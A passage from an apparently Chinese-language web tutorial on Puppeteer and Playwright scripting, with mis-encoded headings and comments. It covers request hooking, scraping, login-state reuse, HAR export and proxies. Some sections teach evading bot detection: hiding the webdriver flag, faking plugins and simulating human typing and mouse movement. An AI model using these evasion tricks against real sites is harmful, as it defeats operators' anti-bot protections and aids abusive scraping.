        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">browser</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>

<span class="c1">// åœ¨é¡µé¢åŠ è½½å‰æ³¨å…¥è„šæœ¬</span>
<span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">evaluateOnNewDocument</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// Hook fetch</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalFetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">fetch</span><span class="p">;</span>
<span class="w">    </span><span class="nb">window</span><span class="p">.</span><span class="nx">fetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[Fetch]&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">[</span><span class="mf">0</span><span class="p">]);</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">originalFetch</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">response</span><span class="p">;</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="c1">// Hook localStorage</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalSetItem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">;</span>
<span class="w">    </span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">key</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[LocalStorage]&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;=&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">originalSetItem</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="w">    </span><span class="p">};</span>
<span class="p">});</span>

<span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="s1">&#39;https://example.com&#39;</span><span class="p">);</span>
</code></pre>
      </div>

      <h3 id="ç»•è¿‡-webdriver-æ£€æµ‹">ç»•è¿‡ Webdriver æ£€æµ‹</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">puppeteer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;puppeteer-extra&#39;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">StealthPlugin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;puppeteer-extra-plugin-stealth&#39;</span><span class="p">);</span>

<span class="nx">puppeteer</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">StealthPlugin</span><span class="p">());</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">browser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">puppeteer</span><span class="p">.</span><span class="nx">launch</span><span class="p">({</span>
<span class="w">    </span><span class="nx">headless</span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
<span class="w">    </span><span class="nx">args</span><span class="o">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">        </span><span class="s1">&#39;--disable-blink-features=AutomationControlled&#39;</span><span class="p">,</span>
<span class="w">        </span><span class="s1">&#39;--disable-dev-shm-usage&#39;</span><span class="p">,</span>
<span class="w">        </span><span class="s1">&#39;--no-sandbox&#39;</span>
<span class="w">    </span><span class="p">]</span>
<span class="p">});</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">browser</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>

<span class="c1">// éšè— webdriver ç‰¹å¾</span>
<span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">evaluateOnNewDocument</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nx">navigator</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;webdriver&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">get</span><span class="o">:</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="kc">undefined</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="c1">// ä¼ªé€  Chrome æ’ä»¶</span>
<span class="w">    </span><span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nx">navigator</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;plugins&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">get</span><span class="o">:</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">[</span><span class="mf">1</span><span class="p">,</span><span class="w"> </span><span class="mf">2</span><span class="p">,</span><span class="w"> </span><span class="mf">3</span><span class="p">,</span><span class="w"> </span><span class="mf">4</span><span class="p">,</span><span class="w"> </span><span class="mf">5</span><span class="p">]</span>
<span class="w">    </span><span class="p">});</span>
<span class="p">});</span>

<span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="s1">&#39;https://bot-detection.com&#39;</span><span class="p">);</span>
</code></pre>
      </div>

      <hr />

      <h2 id="playwright-è„šæœ¬">Playwright è„šæœ¬</h2>

      <h3 id="åŸºç¡€æ¨¡æ¿-2">åŸºç¡€æ¨¡æ¿</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">chromium</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;playwright&#39;</span><span class="p">);</span>

<span class="p">(</span><span class="k">async</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">browser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">chromium</span><span class="p">.</span><span class="nx">launch</span><span class="p">({</span><span class="w"> </span><span class="nx">headless</span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="w"> </span><span class="p">});</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">browser</span><span class="p">.</span><span class="nx">newContext</span><span class="p">();</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">context</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>

<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="s1">&#39;https://example.com&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">screenshot</span><span class="p">({</span><span class="w"> </span><span class="nx">path</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;screenshot.png&#39;</span><span class="w"> </span><span class="p">});</span>

<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">browser</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <h3 id="å¤šæµè§ˆå™¨æµ‹è¯•">å¤šæµè§ˆå™¨æµ‹è¯•</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">chromium</span><span class="p">,</span><span class="w"> </span><span class="nx">firefox</span><span class="p">,</span><span class="w"> </span><span class="nx">webkit</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;playwright&#39;</span><span class="p">);</span>

<span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">testAllBrowsers</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">const</span><span class="w"> </span><span class="nx">browserType</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="p">[</span><span class="nx">chromium</span><span class="p">,</span><span class="w"> </span><span class="nx">firefox</span><span class="p">,</span><span class="w"> </span><span class="nx">webkit</span><span class="p">])</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">browser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">browserType</span><span class="p">.</span><span class="nx">launch</span><span class="p">();</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">browser</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>
<span class="w">        </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>

<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">title</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">title</span><span class="p">();</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`</span><span class="si">${</span><span class="nx">browserType</span><span class="p">.</span><span class="nx">name</span><span class="p">()</span><span class="si">}</span><span class="sb">: </span><span class="si">${</span><span class="nx">title</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>

<span class="w">        </span><span class="k">await</span><span class="w"> </span><span class="nx">browser</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="nx">testAllBrowsers</span><span class="p">(</span><span class="s1">&#39;https://example.com&#39;</span><span class="p">);</span>
</code></pre>
      </div>

      <h3 id="ç§»åŠ¨è®¾å¤‡æ¨¡æ‹Ÿ">ç§»åŠ¨è®¾å¤‡æ¨¡æ‹Ÿ</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">devices</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;playwright&#39;</span><span class="p">);</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">iPhone</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">devices</span><span class="p">[</span><span class="s1">&#39;iPhone 12&#39;</span><span class="p">];</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">browser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">chromium</span><span class="p">.</span><span class="nx">launch</span><span class="p">();</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">browser</span><span class="p">.</span><span class="nx">newContext</span><span class="p">({</span>
<span class="w">    </span><span class="p">...</span><span class="nx">iPhone</span><span class="p">,</span>
<span class="w">    </span><span class="nx">locale</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;zh-CN&#39;</span><span class="p">,</span>
<span class="w">    </span><span class="nx">geolocation</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">longitude</span><span class="o">:</span><span class="w"> </span><span class="mf">116.40</span><span class="p">,</span><span class="w"> </span><span class="nx">latitude</span><span class="o">:</span><span class="w"> </span><span class="mf">39.90</span><span class="w"> </span><span class="p">},</span><span class="w">  </span><span class="c1">// åŒ—äº¬</span>
<span class="w">    </span><span class="nx">permissions</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;geolocation&#39;</span><span class="p">]</span>
<span class="p">});</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">context</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>
<span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="s1">&#39;https://example.com&#39;</span><span class="p">);</span>
</code></pre>
      </div>

      <h3 id="å¹¶å‘çˆ¬å–">å¹¶å‘çˆ¬å–</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">scrapeMultiplePages</span><span class="p">(</span><span class="nx">urls</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">browser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">chromium</span><span class="p">.</span><span class="nx">launch</span><span class="p">();</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">browser</span><span class="p">.</span><span class="nx">newContext</span><span class="p">();</span>

<span class="w">    </span><span class="c1">// å¹¶å‘æ‰“å¼€å¤šä¸ªé¡µé¢</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">promises</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">urls</span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="k">async</span><span class="w"> </span><span class="p">(</span><span class="nx">url</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">context</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>
<span class="w">        </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>

<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">evaluate</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">title</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">title</span><span class="p">,</span>
<span class="w">                </span><span class="nx">content</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerText</span>
<span class="w">            </span><span class="p">};</span>
<span class="w">        </span><span class="p">});</span>

<span class="w">        </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">data</span><span class="p">;</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">results</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nb">Promise</span><span class="p">.</span><span class="nx">all</span><span class="p">(</span><span class="nx">promises</span><span class="p">);</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">browser</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">results</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">urls</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span>
<span class="w">    </span><span class="s1">&#39;https://example.com/page1&#39;</span><span class="p">,</span>
<span class="w">    </span><span class="s1">&#39;https://example.com/page2&#39;</span><span class="p">,</span>
<span class="w">    </span><span class="s1">&#39;https://example.com/page3&#39;</span>
<span class="p">];</span>

<span class="nx">scrapeMultiplePages</span><span class="p">(</span><span class="nx">urls</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">);</span>
</code></pre>
      </div>

      <h3 id="ä¿å­˜ç™»å½•çŠ¶æ€">ä¿å­˜ç™»å½•çŠ¶æ€</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// ç™»å½•å¹¶ä¿å­˜çŠ¶æ€</span>
<span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">saveLoginState</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">browser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">chromium</span><span class="p">.</span><span class="nx">launch</span><span class="p">({</span><span class="w"> </span><span class="nx">headless</span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="w"> </span><span class="p">});</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">browser</span><span class="p">.</span><span class="nx">newContext</span><span class="p">();</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">context</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>

<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="s1">&#39;https://example.com/login&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">fill</span><span class="p">(</span><span class="s1">&#39;#username&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;myuser&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">fill</span><span class="p">(</span><span class="s1">&#39;#password&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;mypassword&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">click</span><span class="p">(</span><span class="s1">&#39;#login-button&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">waitForNavigation</span><span class="p">();</span>

<span class="w">    </span><span class="c1">// ä¿å­˜å­˜å‚¨çŠ¶æ€ï¼ˆåŒ…å« Cookieã€LocalStorage ç­‰ï¼‰</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">context</span><span class="p">.</span><span class="nx">storageState</span><span class="p">({</span><span class="w"> </span><span class="nx">path</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;state.json&#39;</span><span class="w"> </span><span class="p">});</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">browser</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
<span class="p">}</span>

<span class="c1">// åŠ è½½ç™»å½•çŠ¶æ€</span>
<span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">useLoginState</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">browser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">chromium</span><span class="p">.</span><span class="nx">launch</span><span class="p">({</span><span class="w"> </span><span class="nx">headless</span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="w"> </span><span class="p">});</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">browser</span><span class="p">.</span><span class="nx">newContext</span><span class="p">({</span>
<span class="w">        </span><span class="nx">storageState</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;state.json&#39;</span>
<span class="w">    </span><span class="p">});</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">context</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>

<span class="w">    </span><span class="c1">// ç›´æ¥è®¿é—®éœ€è¦ç™»å½•çš„é¡µé¢</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="s1">&#39;https://example.com/dashboard&#39;</span><span class="p">);</span>

<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">browser</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="ç½‘ç»œç›‘æ§å’Œ-har-å¯¼å‡º">ç½‘ç»œç›‘æ§å’Œ HAR å¯¼å‡º</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">browser</span><span class="p">.</span><span class="nx">newContext</span><span class="p">({</span>
<span class="w">    </span><span class="nx">recordHar</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">path</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;network.har&#39;</span><span class="w"> </span><span class="p">}</span>
<span class="p">});</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">context</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>
<span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="s1">&#39;https://example.com&#39;</span><span class="p">);</span>

<span class="c1">// æ“ä½œé¡µé¢...</span>

<span class="k">await</span><span class="w"> </span><span class="nx">context</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span><span class="w">  </span><span class="c1">// HAR æ–‡ä»¶ä¼šè‡ªåŠ¨ä¿å­˜</span>
</code></pre>
      </div>

      <hr />

      <h2 id="è¿›é˜¶æŠ€å·§">è¿›é˜¶æŠ€å·§</h2>

      <h3 id="1-äººç±»è¡Œä¸ºæ¨¡æ‹Ÿ">1. äººç±»è¡Œä¸ºæ¨¡æ‹Ÿ</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// éšæœºå»¶è¿Ÿ</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">randomDelay</span><span class="p">(</span><span class="nx">min</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">100</span><span class="p">,</span><span class="w"> </span><span class="nx">max</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">500</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="p">(</span><span class="nx">max</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">min</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">1</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">min</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// æ¨¡æ‹ŸçœŸå®æ‰“å­—</span>
<span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">typeHuman</span><span class="p">(</span><span class="nx">page</span><span class="p">,</span><span class="w"> </span><span class="nx">selector</span><span class="p">,</span><span class="w"> </span><span class="nx">text</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">click</span><span class="p">(</span><span class="nx">selector</span><span class="p">);</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">const</span><span class="w"> </span><span class="kr">char</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="nx">text</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">type</span><span class="p">(</span><span class="nx">selector</span><span class="p">,</span><span class="w"> </span><span class="kr">char</span><span class="p">);</span>
<span class="w">        </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">waitForTimeout</span><span class="p">(</span><span class="nx">randomDelay</span><span class="p">(</span><span class="mf">50</span><span class="p">,</span><span class="w"> </span><span class="mf">150</span><span class="p">));</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="c1">// éšæœºé¼ æ ‡ç§»åŠ¨</span>
<span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">randomMouseMove</span><span class="p">(</span><span class="nx">page</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">800</span><span class="p">);</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">600</span><span class="p">);</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">mouse</span><span class="p">.</span><span class="nx">move</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="w"> </span><span class="nx">y</span><span class="p">);</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="2-ä»£ç†æ± é›†æˆ">2. ä»£ç†æ± é›†æˆ</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">proxies</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span>
<span class="w">    </span><span class="s1">&#39;http://proxy1.com:8080&#39;</span><span class="p">,</span>
<span class="w">    </span><span class="s1">&#39;http://proxy2.com:8080&#39;</span><span class="p">,</span>
<span class="w">    </span><span class="s1">&#39;http://proxy3.com:8080&#39;</span>
<span class="p">];</span>

<span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">scrapeWithProxy</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
